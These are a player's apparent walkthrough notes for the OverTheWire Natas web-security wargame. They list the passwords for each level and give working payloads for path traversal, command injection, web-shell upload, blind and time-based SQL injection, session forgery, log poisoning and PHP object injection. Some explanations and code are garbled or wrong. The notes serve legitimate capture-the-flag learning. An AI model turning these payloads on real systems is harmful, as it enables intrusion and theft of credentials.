lvl 0 : 
http://natas0.natas.labs.overthewire.org/
natas0
natas0
// inspect source code
gtVrDuiDfck831PqWsLEZy5gyDz1clto 

lvl 1 --> lvl 2
http://natas1.natas.labs.overthewire.org/
natas1
gtVrDuiDfck831PqWsLEZy5gyDz1clto
// ctrl maj j
    // In elements go for <div id="content">
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


lvl 2 --> lvl 3
http://natas2.natas.labs.overthewire.org/
natas2
ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
ctrl u
atas2.natas.labs.overthewire.org/files
http://natas2.natas.labs.overthewire.org/files/users.txt
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

lvl 3 --> lvl 4
http://natas3.natas.labs.overthewire.org/
sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
http://natas3.natas.labs.overthewire.org/robots.txt
http://natas3.natas.labs.overthewire.org/s3cr3t/
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

lvl 4 --> lvl 5
http://natas4.natas.labs.overthewire.org/
Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
// The point of this level is to set the Referer in the Headers to http://natas5.natas.labs.overthewire.org/
// Once done we can access the password
// see natas4.py
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

lvl 5 --> lvl 6
http://natas5.natas.labs.overthewire.org/
natas5
iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
// The point of this level is to set the cookie in the session to 1
// define the cookie parameters you want to change cookies = { 'loggedin': '1'}
// to access a cookie go for resquests.Session()
// to send the cookie to your GET request : session.get(url, cookies = cookies)
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

lvl 6 --> lvl 7
http://natas6.natas.labs.overthewire.org/
natas6
aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
// The point of this level is to find a secret password to add in an input
// Looking at the source code we see an index-source.html
http://natas6.natas.labs.overthewire.org/index-source.html
// once inside it, we see a php conditional <? code ?>. It states : include "includes/secret.inc"
// Taking a look at this file :  http://natas6.natas.labs.overthewire.org/includes/secret.inc
// We get the secret :
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
// 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

lvl 7 --> lvl 8
http://natas7.natas.labs.overthewire.org/
natas7
7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
// The point of this level is to test for Local File Inclusion
// Cf. owasp.org : this vulnerability occurs due to thte use of user-supplied input without proper validation. 
// It allows for directory taversal characters (such as dot-dot-slash) to be injected.
// Typically : http://vulnerable_host/preview.php?file=example.html
// We would then go for : http://vulnerable_host/preview.php?file=../../../../etc/passwd
// Here, we have a hint : password for webuser natas8 is in /etc/natas_webpass/natas8
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

lvl 8 --> lvl 9
http://natas8.natas.labs.overthewire.org/
natas8
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
// The point of this level is to reverse ingineer a password encryption
// Here is the logic :
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
} 
?>
// PHP logic :
<?php
echo(base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362'))));
?>
// Result: oubWYf2kBq
// Adding it in the input we obtain : 
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

lvl 9 --> lvl 10
http://natas9.natas.labs.overthewire.org/
natas9
W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
// The point of this level is to process a PHP command injection
a /dev/null; # // checks all the files in the folder
// ; # allows to end the request and not get the whole dictionnary.txt back
. /etc/natas_webpass/natas10 #
// note a . with a space '. ' means grep anything 
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

lvl 10 --> lvl 11
http://natas10.natas.labs.overthewire.org/
natas10
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
// The point of this level is to process a PHP command injection escaping a certain set of characters ;|&
// in http://natas10.natas.labs.overthewire.org/index-source.html
//
if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    }
// 
// As such, we can keep the same logic as in lvl9 avoiding ';'
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

lvl 11 --> lvl 12
http://natas11.natas.labs.overthewire.org/
natas11
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
// The point of this level is to access $data, which is inside a cookie => session.cookies
// In python print(session.cookies['data']) or ctrl shift j => application => cookie 
// Then we have to reverse ingineer 'data'
// => $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"]))
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
// looking at %3D we know that it is a urlencoded character
urllib.parse.unquote(session.cookies['data'])
// then base64
base64.b64decode(urllib.parse.unquote(session.cookies['data']))
b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
// then we see from the code that run the code through xor_encrypt() 
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
// xor_encryption logic : 
plaintext ^ key = ciphertext
plaintext ^ciphertext = key
// lets figure out the key as we have both the plaintext and the ciphertext
plaintext = json_encode($defaultdata) = {"showpassword":"no","bgcolor":"#ffffff"}
cyphertext (in php) = hex2bin(b'0a554b221e00482b02044f2503131a70531957685d555a2d121854250355026852115e2c17115e680c')

// for reasons beyond my understanding, it seeams that be should hexify our data as it easier to deal with
b'0a554b221e00482b02044f2503131a70531957685d555a2d121854250355026852115e2c17115e680c'

// echo(xor_encrypt($plainText, $cypherText))
// this is supposed to give us our key = 'qw8J'
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
// Then we can reverse ingineer it and look for the good cypherText
$good_data = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
$good_plainText = json_encode($good_data);
$good_cypherText = xor_encrypt($good_plainText, $key);
echo($good_cypherText)
UK"H+O%pS]9S[(W&pST^,^,S
"// From the file, we have to then base64_encode it  
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
//
$cookie = base64_encode($good_cypherText);
echo($cookie);
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
// Now that we have the data, we have to send it with the cookie, see natas.py
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3<br>

lvl 12 --> lvl 13
http://natas12.natas.labs.overthewire.org/
natas12
EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
// The point of the level is to post data (php code) that the site would execute
// we want to post a php file that would allow us to get access to command line
In python :
requests.post(url, files = {'uploadedfile' : open('natas12.php', 'rb')}, data = {'filename': 'natas12.php', 'MAX_FILE_SIZE': '1000'}, auth=(username, password))
// the php loading worked, We get a file creation path : upload/jugty0ntdu.php
session.get(url + 'upload/umde6zpk53.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

lvl 13 --> lvl 14
http://natas13.natas.labs.overthewire.org/
natas13
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
// The point of this level is to upload a file to the server circumventing its check for a jpeg file
// Mainly, we want to hide the php description on writing command : file natas13.php
// To do so, we add a header in our php file saying otherwise (GIF89a)
// Now on writing file natas13.php, we get : natas13.php: GIF image data, version 89a, 2573 x 2573
// We successfully loaded our file and get : 
The file <a href="upload/tnmjsvarti.php">upload/tnmjsvarti.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
// We can now access data through :
response = session.get(url + 'upload/tnmjsvarti.php?c= cat /etc/natas_webpass/natas14', auth = (username, password))
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

lvl 14 --> lvl 15
http://natas14.natas.labs.overthewire.org/
natas14
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
// The point of this level is to realise a SQL injection as the code shows direct SQL queries with variables in it controlled directly by the user
// See the code
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 
// 
// As it concatinates using double quotes "", we can try to break the code using '"'
response = session.post(url, data = {"username": 'please"', "password": "subscribe"}, auth=(username, password))
response = session.post(url, data = {"username": 'please" hello holy molly', "password": "subscribe"}, auth=(username, password))
// See the returned code
Executing query: SELECT * from users where username="please" hello holy molly" and password="subscribe"<br><br />
// "
// Now that we know that there is a SQL vulnerability, lets inject correct SQL queries
response = session.post(url, data = {"username": 'please" OR 1=1 #', "password": "subscribe"}, auth=(username, password))
// the pound # makes the reste of the query unmarked 
//  OR 1=1 means OR everything returns true 
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div

lvl 15 --> lvl 16
http://natas15.natas.labs.overthewire.org/
natas15
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
// The point of this level is to process a BLIND SQL injection
// After having guessed that the useranme was natas16, we had to look for the password
Take a look at our SQL query
response = session.post(url, data={
                        "username": 'natas16" AND password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username, password))
// 
// We had to create a loop, to loop for our list of characters (a,b,c,d...,0,1,2,...A,B,C,D,...)
// Adding BINARY will make our request case sensitive
response = session.post(url, data={
                        "username": 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username, password))
// We added the following code to our loop to append each new character to our result
if ('user exists' in content):
            seen_password.append(ch)
            break
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

lvl 16 --> lvl 17
http://natas16.natas.labs.overthewire.org/
natas16
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
// The point of this level is to process a Blind Grep 
// We can pass data through an input checking if our data feets into a dictionnary.txt
// Blacklisting of several characters, see code.
// $key is passed in double quotes, it is isolated as its own argument
// $() allows for command substitution, we can send commands throug it 
anything$(grep ^b /etc/natas_webpass/natas17)
// anything allows us to get some data back from dictionary.txt
// grep ^b, the carrot is a regular expression meaning the very first character (b is the first character)
// if there is an answer, it means that b is the first charac

// This idea is to loop though an alphabet, and grep each value of this alphabet from what is in the file
// If grep returns true, we have match and can append each of the letter found in a variable called password
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

lvl 17 --> lvl 18 
// note Their SQL database did not seem to work 
http://natas17.natas.labs.overthewire.org/
natas17
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
// The point of this level is to realise a SQL Injection.
// The difficulty is that we cant have any idea of the results of our queries
 if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 
// We will use SLEEP as a way to mesure the time needed if we get an anwser, we will compare the time for the right and wrong answer to come back and construct our password as such
//
while ( len(seen_password) < 32 ):

	for character in characters:
		start_time = time()

		print("trying", "".join(seen_password) + character)
		response = session.post(url, data = {"username": 'natas18" AND BINARY password LIKE "' + "".join(seen_password) + character +  '%" AND SLEEP(1) # '}, auth = (username, password) )
        content = response.text
		end_time = time()
		difference = end_time - start_time
		

		if ( difference > 1 ):
			# success, correct character!
			seen_password.append(character)
			break
        print(content)
//
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

lvl 18 --> lvl 19
http://natas18.natas.labs.overthewire.org/
natas18
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
// The point of this level is to play around with PHPSESSID. We have to loop through 1 to 640 to find 
// the one giving us admin access
// Python loop
or session_id in range(1, 641):
    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))
    content = response.text

    if( "You are an admin" in content):
        print('You got it', session_id)
        print(content)
    else:
        print('Still trying', session_id)
//
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

lvl 19 --> lvl 20
http://natas19.natas.labs.overthewire.org/
natas19
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
// From the page : This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
// We had to get the session.cookies['PHPSESSID'], showing some regularity 
302d61646d696e
312d61646d696e
322d61646d696e
// Playing around with it, we converted to hex to obtain randomNumbers-dusername 
// so we decided to replace username by admin and to loop through 0 to 640 to replace our randomNumbers
// Then we had to reconvert it to hex
for i in range(641):
    session = requests.Session()
    session_id = (f'{i}-admin').encode("utf-8").hex()
    response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password))
    content = response.text
      if( "You are an admin" in content):
        print('You got it', i)
        print(content)
    else:
        print('Still trying', i)
// eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

lvl 20 --> lvl 21
http://natas20.natas.labs.overthewire.org/
natas20
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
// The point of this level is to inject data through a PHP Sesson Handler for role elevation

// As soon as you login to the level, you are greeted with a message saying that “You are logged in as a regular user. Login as an admin to retrieve credentials for natas21”.
// Looking at the source code we see a lot of code

1. debug($msg) just turn on debug. You can try it by adding “/index.php?debug” at the end of the url and hit enter to see the debug messages, $msg.

2. print_credentials()  will print natas21 username and password if the following conditionals are satisfied:
    a. $_SESSION is true if there is an existing session. The array $_SESSION is not empty.
    b. array_key_exists(“admin”, $_SESSION) is true if “admin” key is set in $_SESSION.
    c. $_SESSION[“admin”] == 1 is true if the value associated with the key “admin” in $_SESSION is set to 1

3. myopen($path, $name) always return true.

4. myclose() always return true.

5. myread($sid) has several parts.
    a. The first if(strspn….) statement check if the $sid contains characters that is within the long string of characters. If it is not, return “Invalid SID”. Otherwise, continue.
    b. Then, it check to see if the path exist for the file call /mysess_$sid. For example, if $sid is abcdefg, it is checking for the file mysess_abcdefg. If the file exist, continue.
    c. Here, we see that the content of the file is save in $data and the foreach loop take each new line of $data and put it in $line. Then, it takes each space separated word in each $line and put them in an array call $parts. If the first part ($parts[0]) is not an empty string, then it will use the first part as the session key and the second part ($parts[1]) as the value corresponding to that key.

6. mywrite($sid, $data) also has several parts.
    a. The first if(strspn …) does the same check for valid $sid in myread()
    b. The same $filename is created using the $sid
    c. The key is sorted in $_SESSION and the foreach loop take the pair of $key and corresponding $value and add it as a new line in $data. The $data is then write to the $filename.

7. mydestroy($sid) always return true.

8. mygarbage($t) always return true

9. main interface does the following:
    a. session_start().
    b. check name is in the $_REQUEST, if so, set the $_SESSION[“name”] to $_REQUEST[“name”]. If we input “test” as a name, it will correspond “test” as the print_credentials()
    c. set $name to empty string and check if “name” is in the $_SESSION, if so, set the variable $name to $_SESSION[“name”]

// the most important part is the myread() and mywrite(). Especially in mywrite(), it is writing each $key and $value pair with a new line. We know from print_credentials(), we need a $key and $value pair of “admin” and 1 to get access to the next password. If we add a line “admin 1” in the file, the myread() function will read it out with no problem. So our input must be include “admin 1” on a newline. 

// See the following python code
// Two requests as we establish the session and then request it
response = session.post(
    url, data={'name': 'test\nadmin 1'}, auth=(username, password))
content = response.text
print(content)
print('='*80)

response = session.get(url, auth=(username, password))
content = response.text
print(content)
print('='*80)

// IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>

lvl 21 --> lvl 22
http://natas21.natas.labs.overthewire.org/
natas21
IFekPyrQXftziDEsUr3x21sYuahypdgJ
// The point of this level is to realise a Cross-Site Session Hijacking
// We connect to one site, post value ('submit' = '1' and 'admin' = '1'), save the resulting cookie 
// We connect to the other side, set the new cookie to the previous one
// See the python code: 
response = session.post(experimenter, data = {'submit': '1', 'admin': '1'}, auth=(username, password))
old_session = session.cookies['PHPSESSID']
response = session.get(url, cookies = {"PHPSESSID": old_session}, auth=(username, password))
// chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

lvl 22 --> lvl 23
http://natas22.natas.labs.overthewire.org/
natas22
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
// The point of this level is to disallow redirects
// php code
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
// Looking a the code if we have a get request for revelio and $_SESSION['admin'] != 1 we will get redirected
// so lets disallow redirection
esponse = session.get(url, auth=(username, password), allow_redirects = False)
// D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

lvl 23 --> lvl 24
http://netas23.natas.labs.overthewire.org/
netas23
D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
// The point of this level is to manipulate PHP Type. 
// See the code below :
if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
}
// We have to find a passw match a string 'iloveyou' and being > to the number 10
// PHP uses dynamic type setting according to context, it does not rquire explicit type support.
// So we have to set passwd to '11iloveyou', 11 will be interpreted as a Number, then iloveyou as a String
// OsRmXFguozKpTZZ5X14zNO43379LZveg

lvl 24 --> lvl 25
http://netas24.natas.labs.overthewire.org/
natas24
OsRmXFguozKpTZZ5X14zNO43379LZveg
// strcompare (strcmd()) returns 
// < 0 if str1 less than str2; > 0 if str1 greater than str2, and 0 if they are equal
// It is often used negatively if( it does NOT return 0) this condition evaluates to true, str1 and str2 are equal
// See the code: 
  if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
  }
// A simple way to circumvent this code is to post an array instead of a string. 
// In this situation, strcmp automatically returns 0
// See the code below :
response = session.post(url, data={'passwd[]': 'gzzz'}, auth=(username, password))
//
GHF6X7YwACaYYssHVY05cFq83hRktl4c

lvl 25 --> lvl 26
http://netas25.natas.labs.overthewire.org/
natas25
GHF6X7YwACaYYssHVY05cFq83hRktl4c
// The point of this level is to circumvent two obstacles to process a LFI and RCE with User-Agent
// See the php code below :
if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
}
// First the code replaces ../ by '', so playing with python cmd we get that ..././ gives ../
// So with the fallowing python code, we succeeded our LFI
response = session.post(url, data = {'lang': '..././..././..././..././..././..././etc/passwd'}, auth=(username, password))
// Now see the php code below, we cannot directly access /natas_webpass/ 
if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
}
// The code blacklists natas_webpass
// So lets see some other interesting php code :
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
// We can acutally access the logs for natas25, to do that lets get the session_id, through session.cookies
response = session.post(url, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}, auth=(username, password))
// Answer : [05.02.2019 10::01:46] python-requests/2.20.1 "Directory traversal attempt! fixing request."
// We have controle over the user-agent python-requests/2.20.1 in our http header, we can change it.
// Lets put php code in place of our user agent, to process a RCE
//
headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
response = session.post(url, headers = headers, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'},
// 
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

lvl 26 --> lvl 27
http://netas26.natas.labs.overthewire.org/
natas26
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
// Natas 26 is a drawing tool that gives you the ability to input X,Y coordinates and see a picture of a line drawn between two points
// One thing that immediately sticks out is that the filename of the image uses the session ID directly and is clearly injectable, see :
if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
// Furthermore, I started wondering about the Logger class. It doesn't seem to be used anywhere, so it's strange that its there.
// It looks like their PHP code will unserialize an arbitrary object contained in the "drawing" cookie. Because of this, we can use this by sending it a serialized Logger object with the fields set in such a way that it will create a shell.php script on the server for us.
// Lets get to it :
After sending data, we can take a look at session.cookies['drawing'], looking at the result it is url encoded and base64 encoded. We thus obtain :
# dataDecoded = (urllib.parse.unquote(data))
# print(base64.b64decode(dataDecoded))
# PHP serialized data : b'a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'
// As such, we can inject PHP code through this channel, we write up code, encode it and serialize to push it.
// To do so we modified the php code to the following (just modifying the data set): 
 
 <?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file)
    {
            // initialise variables
        $this->initMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/winner.php";
      
            // write initial message
        $fd = fopen($this->logFile, " a + ");
        fwrite($fd, $initMsg);
        fclose($fd);
    }

    function log($msg)
    {
        $fd = fopen($this->logFile, " a + ");
        fwrite($fd, $msg . " \n ");
        fclose($fd);
    }

    function __destruct()
    {
            // write exit message
        $fd = fopen($this->logFile, " a + ");
        fwrite($fd, $this->exitMsg);
        fclose($fd);
    }
}

$object = new Logger("");
echo( base64_encode(serialize($object)) );

?>
// We thus obtain our php code that we just have to set in the cookie
session.cookies['drawing'] =  ' Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
// In our code we injected code redirecting is product to img/winner.php
// So lets make a get request to it: 
// response = session.get(url + '/img/winner.php', auth=(username, password))
// 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ


lvl 27 --> lvl 28
http://netas27.natas.labs.overthewire.org/
natas27
// The point of this level is to play around with SQL queries, mainly tricks to known on truncation
// All MySQL collations are of type PADSPACE. This means that all CHAR and VARCHAR values in MySQL are compared without regard to any trailing spaces. 
In particular, trailing spaces are significant, which is not true for CHAR or VARCHAR comparisons performed with the = operator //
// The trick is to add a new user called 'natas28 ' with a SPACE at the end, on querying for data, SQL will give away 'natas28' and 'natas28 ' in the same manner ! What a joke ! 
// REALLY sanitize/trim-to-valid-data/know-what-to-expect-of/dont-trust user input.
// See the python code
response = session.post(url, data={
                        'username': 'natas28' + ' '*58 + 'anything', 'password': 'anything'}, auth=(username, password))
response = session.post(url, data={
                        'username': 'natas28', 'password': 'anything'}, auth=(username, password))
content = response.text
//
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ